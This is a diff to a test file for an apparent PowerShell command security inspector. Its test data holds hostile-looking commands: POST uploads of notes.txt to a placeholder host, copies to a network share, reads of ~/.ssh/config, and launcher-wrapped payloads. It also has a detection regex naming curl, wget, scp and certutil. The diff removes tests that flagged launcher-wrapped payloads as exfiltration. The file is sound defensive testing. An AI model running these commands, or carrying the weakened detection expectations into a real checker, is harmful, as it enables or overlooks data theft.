@@ -37,32 +37,29 @@ const LAUNCHERS = [
   "launch-vsdevshell.ps1 $script", "shell32.dll $entry",
 ];
 
-const LITERAL_ARGUMENT_UPLOADS = [
+const COMMAND_ARGUMENTS = [
   `Unknown-Runner '${PAYLOAD}'`, `mystery.exe '${PAYLOAD}'`,
   `Write-Output '${PAYLOAD}'`, `Set-Clipboard '${PAYLOAD}'`,
   `Unknown-Runner -Payload:'${PAYLOAD}'`,
   `Unknown-Runner 'powershell.exe -NoProfile -Command ${PAYLOAD}'`,
   `Unknown-Runner 'cmd /c powershell.exe -Command ${PAYLOAD}'`,
   `Unknown-Runner '"powershell.exe" -Command ${PAYLOAD}'`,
-  `Unknown-Runner 'Unknown-Runner "${PAYLOAD}"'`,
-  "Unknown-Runner 'Get-Content notes.txt | Out-Printer -Name $printer'",
-  String.raw`Unknown-Runner 'copy /b notes.txt \\host\share\notes.txt'`,
-  String.raw`Write-Output 'move /Y notes.txt \\host\share\notes.txt'`,
-  `Unknown-Runner ("${PAYLOAD}")`,
-  `$command = '${PAYLOAD}'; Unknown-Runner $command`,
-];
-
-const COMMAND_ARGUMENTS = [
   "Unknown-Runner 'schtasks /Run /TN Upload > task.txt'",
   "Write-Output 'cmd /c UploadTask > task.txt'",
+  `Unknown-Runner 'Unknown-Runner "${PAYLOAD}"'`,
   "Unknown-Runner 'Get-Content ~/.ssh/config'",
+  "Unknown-Runner 'Get-Content notes.txt | Out-Printer -Name $printer'",
   "Unknown-Runner 'ForEach-Object -MemberName Upload'",
   "Unknown-Runner 'Get-Content $path'",
   "Unknown-Runner 'head.exe notes.txt'",
+  String.raw`Unknown-Runner 'copy /b notes.txt \\host\share\notes.txt'`,
+  String.raw`Write-Output 'move /Y notes.txt \\host\share\notes.txt'`,
+  `Unknown-Runner ("${PAYLOAD}")`,
   "Unknown-Runner (('iw' + 'r https://x.invalid -InFile notes.txt -Method Post'))",
   'Unknown-Runner "powershell -Command $code"',
   'Unknown-Runner "cmd /c $code"',
   'Unknown-Runner "iwr https://x.invalid -Body $body -Method Post"',
+  `$command = '${PAYLOAD}'; Unknown-Runner $command`,
 ];
 
 const OUTPUTS = [
@@ -98,16 +95,10 @@ describe("launcher payload and outbound-output floors", () => {
     const result = inspectPowerShellCommand(command, CWD);
     const directTransport = /^(?:curl\.exe|wget\.exe|scp|sftp|ftp|tftp|certutil\.exe -urlcache)\b/.test(command);
     if (directTransport) expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: expect.anything() });
-    else if (command.includes(PAYLOAD)) expect(result).toMatchObject({ outcome: "visible-floor", sensitive: null, exfiltration: expect.any(String) });
     else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
-  it.each(LITERAL_ARGUMENT_UPLOADS)("retains an upload floor from literal argument data: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD))
-      .toMatchObject({ outcome: "visible-floor", sensitive: null, exfiltration: expect.any(String) });
-  });
-
-  it.each(COMMAND_ARGUMENTS)("preserves benign and computed argument visibility: %s", (command) => {
+  it.each(COMMAND_ARGUMENTS)("does not execute or recursively inspect command-looking argument data: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
     if (command.includes("~/.ssh/config")) expect(result).toMatchObject({ outcome: "visible-floor", sensitive: expect.anything() });
     else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
@@ -137,10 +128,9 @@ describe("launcher payload and outbound-output floors", () => {
     if (command === "git status") expect(inspectPowerShellCommand(command, CWD).outcome).toBe("unproven");
   });
 
-  it("retains a literal launcher upload without proving its execution", () => {
+  it("keeps a literal launcher payload opaque", () => {
     const result = inspectPowerShellCommand(`wmic process call create 'powershell -c ${PAYLOAD}'`, CWD);
-    expect(result).toMatchObject({ outcome: "visible-floor", sensitive: null, exfiltration: expect.any(String) });
-    expect(result.exactLiteralEvaluation).toBeUndefined();
+    expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
   it("declines repeated unknown command arguments below the caps", () => {
